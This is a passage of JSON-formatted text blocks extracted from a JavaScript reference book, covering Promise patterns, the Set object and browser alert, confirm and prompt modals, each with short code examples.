        "text": "function  foo ( arg )   {    return  Promise. resolve ()     . then (()   =>   {        if   ( arg  ===   'unexepectedValue' )   {          throw   new  Error ( 'UnexpectedValue' )        }        return   new  Promise ( resolve  =>         setTimeout (()   =>  resolve ( arg ),   1000 )        )      }) }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 42.8: Reconciling synchronous and asynchronous operations",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In some cases you may want to wrap a synchronous operation inside a promise to prevent repetition in code branches. Take this example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( result )   {   // if we already have a result",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  processResult ( result );   // process it }   else   {   fetchResult () . then ( processResult ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The synchronous and asynchronous branches of the above code can be reconciled by redundantly wrapping the synchronous operation inside a promise:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  fetch  =  result    ?  Promise. resolve ( result )    :  fetchResult (); fetch. then ( processResult );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When caching the result of an asynchronous call, it is preferable to cache the promise rather than the result itself. This ensures that only one asynchronous operation is required to resolve multiple parallel requests. Care should be taken to invalidate cached values when error conditions are encountered.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// A resource that is not expected to change frequently",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  planets  =   'http://swapi.co/api/planets/' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// The cached promise, or null",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 273",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  cachedPromise ; function  fetchResult ()   {      if   (! cachedPromise )   {         cachedPromise  =  fetch ( planets )             . catch ( function   ( e )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                 // Invalidate the current result to retry on the next fetch",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                cachedPromise  =   null ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                 // re-raise the error to propagate it to callers",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "                 throw  e ;              });      }      return  cachedPromise ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 42.9: Delay function call",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  setTimeout ()  method calls a function or evaluates an expression after a speci\ufb01ed number of milliseconds. It is also a trivial way to achieve an asynchronous operation. In this example calling the  wait  function resolves the promise after the time speci\ufb01ed as \ufb01rst argument:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  wait ( ms )   {      return   new  Promise ( resolve  =>  setTimeout ( resolve ,  ms ));    } wait ( 5000 ) . then (()   =>   {     console. log ( '5 seconds have passed...' ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 42.10: \"Promisifying\" values",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  Promise. resolve  static method can be used to wrap values into promises.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  resolved  =  Promise. resolve ( 2 ); resolved. then ( value  =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // immediately invoked      // value === 2 });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If  value  is already a promise,  Promise. resolve  simply recasts it.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  one  =   new  Promise ( resolve  =>  setTimeout (()   =>  resolve ( 2 ),   1000 )); let  two  =  Promise. resolve ( one ); two. then ( value  =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // 1 second has passed      // value === 2 });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In fact,  value  can be any \"thenable\" (object de\ufb01ning a  then  method that works su\ufb03ciently like a spec-compliant promise). This allows  Promise. resolve  to convert untrusted 3rd-party objects into trusted 1st-party Promises.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  resolved  =  Promise. resolve ({     then ( onResolved )   {         onResolved ( 2 );      } }); resolved. then ( value  =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 274",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     // immediately invoked      // value === 2 });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  Promise. reject  static method returns a promise which immediately rejects with the given  reason .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  rejected  =  Promise. reject ( \"Oops!\" ); rejected. catch ( reason  =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // immediately invoked      // reason === \"Oops!\" });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 42.11: Using ES2017 async/await",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The same example above, Image loading, can be written using async functions. This also allows using the common try / catch  method for exception handling. Note:  as of April 2017, the current releases of all browsers but Internet Explorer supports async functions .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  loadImage ( url )   {      return   new  Promise (( resolve ,  reject )   =>   {          const  img  =   new  Image ();         img. addEventListener ( 'load' ,   ()   =>  resolve ( img ));         img. addEventListener ( 'error' ,   ()   =>   {             reject ( new  Error ( `Failed to load $ { url } ` ));          });         img. src   =  url ;      }); } ( async  ()   =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // load /image.png and append to #image-holder, otherwise throw error",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     try   {          let  img  =  await loadImage ( 'http://example.com/image.png' );         document. getElementById ( 'image-holder' ) . appendChild ( img );      }      catch   ( error )   {         console. error ( error );      } })();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 42.12: Performing cleanup with \ufb01nally()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "There is currently a  proposal  (not yet part of the ECMAScript standard) to add a  finally  callback to promises that will be executed regardless of whether the promise is ful\ufb01lled or rejected. Semantically, this is similar to the finally  clause of the  try  block . You would usually use this functionality for cleanup:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  loadingData  =   true ; fetch ( '/data' )     . then ( result  =>  processData ( result. data ))     . catch ( error  =>  console. error ( error ))     . finally (()   =>   {         loadingData  =   false ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 275",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It is important to note that the  finally  callback doesn't a\ufb00ect the state of the promise. It doesn't matter what value it returns, the promise stays in the ful\ufb01lled/rejected state that it had before. So in the example above the promise will be resolved with the return value of  processData ( result. data )  even though the  finally  callback returned",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "undefined .",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With the standardization process still being in progress, your promises implementation most likely won't support finally  callbacks out of the box. For synchronous callbacks you can add this functionality with a poly\ufb01ll however:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   (! Promise. prototype . finally )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    Promise. prototype . finally   =   function ( callback )   {          return   this . then ( result  =>   {             callback ();              return  result ;          },  error  =>   {             callback ();              throw  error ;          });      }; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 42.13: forEach with promises",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "It is possible to e\ufb00ectively apply a function ( cb ) which returns a promise to each element of an array, with each element waiting to be processed until the previous element is processed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  promiseForEach ( arr ,  cb )   {    var  i  =   0 ;    var  nextPromise  =   function   ()   {      if   ( i  >=  arr. length )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       // Processing finished.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       return ;      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Process next function. Wrap in `Promise.resolve` in case      // the function does not return a promise",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  newPromise  =  Promise. resolve ( cb ( arr [ i ],  i ));     i ++;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Chain to finish processing.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return  newPromise. then ( nextPromise );    };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Kick off the chain.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return  Promise. resolve () . then ( nextPromise ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This can be helpful if you need to e\ufb03ciently process thousands of items, one at a time. Using a regular  for  loop to create the promises will create them all at once and take up a signi\ufb01cant amount of RAM.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 42.14: Asynchronous API request",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This is an example of a simple  GET  API call wrapped in a promise to take advantage of its asynchronous functionality.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var   get   =   function ( path )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 276",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   return   new  Promise ( function ( resolve ,  reject )   {      let  request  =   new  XMLHttpRequest ();     request. open ( 'GET' ,  path );     request. onload   =  resolve ;     request. onerror   =  reject ;     request. send ();    }); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "More robust error handling can be done using the following  onload  and  onerror  functions.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "request. onload   =   function ()   {    if   ( this . status   >=   200   &&   this . status   <   300 )   {      if ( request. response )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       // Assuming a successful call returns JSON",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      resolve ( JSON. parse ( request. response ));      }   else   {       resolve ();    }   else   {     reject ({        'status' :   this . status ,        'message' :  request. statusText      });    } }; request. onerror   =   function ()   {   reject ({      'status' :   this . status ,      'message' :  request. statusText    }); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 277",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 43: Set",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "iterable If an iterable object is passed, all of its elements will be added to the new Set. null is treated as unde\ufb01ned. value The value of the element to add to the Set object. callback Function to execute for each element. thisArg Optional. Value to use as this when executing callback. The Set object lets you store unique values of any type, whether primitive values or object references. Set objects are collections of values. You can iterate through the elements of a set in insertion order. A value in the Set may only occur  ONCE ; it is unique in the Set's collection. Distinct values are discriminated using the SameValueZero  comparison algorithm. Standard Speci\ufb01cation About Set",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.1: Creating a Set",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The Set object lets you store unique values of any type, whether primitive values or object references. You can push items into a set and iterate them similar to a plain JavaScript array, but unlike array, you cannot add a value to a Set if the value already exist in it. To create a new set:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  mySet  =   new  Set ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or you can create a set from any iterable object to give it starting values:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  arr  =   [ 1 , 2 , 3 , 4 , 4 , 5 ]; const  mySet  =   new  Set ( arr );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the example above the set content would be  { 1 ,   2 ,   3 ,   4 ,   5 } . Note that the value 4 appears only once, unlike in the original array used to create it.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.2: Adding a value to a Set",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To add a value to a Set, use the  . add ()  method:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "mySet. add ( 5 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If the value already exist in the set it will not be added again, as Sets contain unique values. Note that the  . add ()  method returns the set itself, so you can chain add calls together:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "mySet. add ( 1 ) . add ( 2 ) . add ( 3 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 43.3: Removing value from a set",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To remove a value from a set, use  . delete ()  method:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 278",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "mySet. delete ( some_val );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This function will return  true  if the value existed in the set and was removed, or  false  otherwise.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.4: Checking if a value exist in a set",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To check if a given value exists in a set, use  . has ()  method:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "mySet. has ( someVal );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Will return  true  if  someVal  appears in the set,  false  otherwise.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 43.5: Clearing a Set",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can remove all the elements in a set using the  . clear ()  method:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "mySet. clear ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 43.6: Getting set length",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can get the number of elements inside the set using the  . size  property",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  mySet  =   new  Set ([ 1 ,   2 ,   2 ,   3 ]); mySet. add ( 4 ); mySet. size ;   // 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This property, unlike  Array. prototype . length , is read-only, which means that you can't change it by assigning something to it:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "mySet. size   =   5 ; mySet. size ;   // 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In strict mode it even throws an error:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "TypeError :  Cannot  set  property size of # < Set >  which has only a getter",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 43.7: Converting Sets to arrays",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Sometimes you may need to convert a Set to an array, for example to be able to use  Array. prototype  methods like",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": ". filter () . In order to do so, use  Array. from ()  or  destructuring - assignment : var  mySet  =   new  Set ([ 1 ,   2 ,   3 ,   4 ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//use Array.from",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  myArray  =  Array. from ( mySet );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//use destructuring-assignment",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  myArray  =   [ ... mySet ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now you can \ufb01lter the array to contain only even numbers and convert it back to Set using Set constructor:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "mySet  =   new  Set ( myArray. filter ( x  =>  x  %   2   ===   0 ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "mySet  now contains only even numbers:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 279",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( mySet );   // Set {2, 4}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 43.8: Intersection and di\ue023erence in Sets",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "There are no build-in methods for intersection and di\ufb00erence in Sets, but you can still achieve that but converting them to arrays, \ufb01ltering, and converting back to Sets:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  set1  =   new  Set ([ 1 ,   2 ,   3 ,   4 ]),     set2  =   new  Set ([ 3 ,   4 ,   5 ,   6 ]); const  intersection  =   new  Set ( Array. from ( set1 ) . filter ( x  =>  set2. has ( x ))); //Set {3, 4} const  difference  =   new  Set ( Array. from ( set1 ) . filter ( x  =>   ! set2. has ( x )));   //Set {1, 2}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 43.9: Iterating Sets",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can use a simple for-of loop to iterate a Set:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  mySet  =   new  Set ([ 1 ,   2 ,   3 ]); for   ( const  value of mySet )   {   console. log ( value );   // logs 1, 2 and 3 }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When iterating over a set, it will always return values in the order they were \ufb01rst added to the set. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const   set   =   new  Set ([ 4 ,   5 ,   6 ]) set . add ( 10 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "set . add ( 5 )   //5 already exists in the set Array. from ( set )   //[4, 5, 6, 10]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "There's also a  . forEach ()  method, similar to  Array. prototype . forEach () . It has two parameters,  callback , which will be executed for each element, and optional  thisArg , which will be used as  this  when executing  callback . callback  has three arguments. The \ufb01rst two arguments are both the current element of Set (for consistency with Array. prototype . forEach ()  and  Map. prototype . forEach () ) and the third argument is the Set itself.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "mySet. forEach (( value ,  value2 ,   set )   =>  console. log ( value ));   // logs 1, 2 and 3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 280",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 44: Modals - Prompts",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 44.1: About User Prompts",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "User Prompts  are methods part of the  Web Application API  used to invoke Browser modals requesting a user action such as con\ufb01rmation or input.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. alert ( message )",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Show a modal  popup  with a message to the user. Requires the user to click [OK] to dismiss.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "alert ( \"Hello World\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "More information below in \"Using alert()\".",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "boolean   =  window. confirm ( message )",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Show a modal  popup  with the provided message. Provides [OK] and [Cancel] buttons which will respond with a boolean value  true  /  false  respectively.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "confirm ( \"Delete this comment?\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "result  =  window. prompt ( message ,  defaultValue )",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Show a modal  popup  with the provided message and an input \ufb01eld with an optional pre-\ufb01lled value. Returns as  result  the user provided input value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "prompt ( \"Enter your website address\" ,   \"http://\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "More information below in \"Usage of prompt()\".",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. print ()",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Opens a modal with document print options.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "print ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 44.2: Persistent Prompt Modal",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When using  prompt  a user can always click  Cancel  and no value will be returned. To prevent empty values and make it more  persistent :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<h2> Welcome  <span   id = \"name\" ></span> ! </h2>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "< script >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Persistent Prompt modal",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  userName ; while (! userName )   {   userName  =  prompt ( \"Enter your name\" ,   \"\" );    if (! userName )   {     alert ( \"Please, we need your name!\" );    }   else   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 281",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    document. getElementById ( \"name\" ) . innerHTML   =  userName ;    } } </ script >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "jsFiddle demo",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 44.3: Con\ufb01rm to Delete element",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A way to use  confirm ()  is when some UI action does some  destructive  changes to the page and is better accompanied by a  noti\ufb01cation  and a  user con\ufb01rmation  - like i.e. before deleting a post message:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<div   id = \"post-102\" >    <p> I like Confirm modals. </p>    <a   data-deletepost = \"post-102\" > Delete post </a>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</div>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<div   id = \"post-103\" >    <p> That's way too cool! </p>    <a   data-deletepost = \"post-103\" > Delete post </a>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</div>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Collect all buttons",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  deleteBtn  =  document. querySelectorAll ( \"[data-deletepost]\" ); function  deleteParentPost ( event )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  event. preventDefault ();   // Prevent page scroll jump on anchor click  ",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   if (  confirm ( \"Really Delete this post?\" )   )   {      var  post  =  document. getElementById (   this . dataset . deletepost   );     post. parentNode . removeChild ( post );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // TODO: remove that post from database    }   // else, do nothing   } // Assign click event to buttons",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[] . forEach . call ( deleteBtn ,   function ( btn )   {   btn. addEventListener ( \"click\" ,  deleteParentPost ,   false ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "jsFiddle demo",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 44.4: Usage of alert()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  alert ()  method of the  window  object displays an  alert box  with a speci\ufb01ed message and an   OK   or   Cancel  button. The text of that button depends on the browser and can't be modi\ufb01ed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "alert ( \"Hello world!\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Or, alternatively...",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "window. alert ( \"Hello world!\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Produces",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 282",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "An  alert box  is often used if you want to make sure information comes through to the user. Note:  The alert box takes the focus away from the current window, and forces the browser to read the message. Do not overuse this method, as it prevents the user from accessing other parts of the page until the box is closed. Also it stops the further code execution, until user clicks   OK  . (in particular, the timers which were set with setInterval ()  or  setTimeout ()  don't tick either). The alert box only works in browsers, and its design cannot be modi\ufb01ed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_298_1.png"
        ]
    },
    {
        "text": "Parameter Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "message Required. Speci\ufb01es the text to display in the alert box, or an object converted into a string and displayed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Return value",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "alert  function doesn't return any value",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 44.5: Usage of prompt()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Prompt will display a dialog to the user requesting their input. You can provide a message that will be placed above the text \ufb01eld. The return value is a string representing the input provided by the user.",
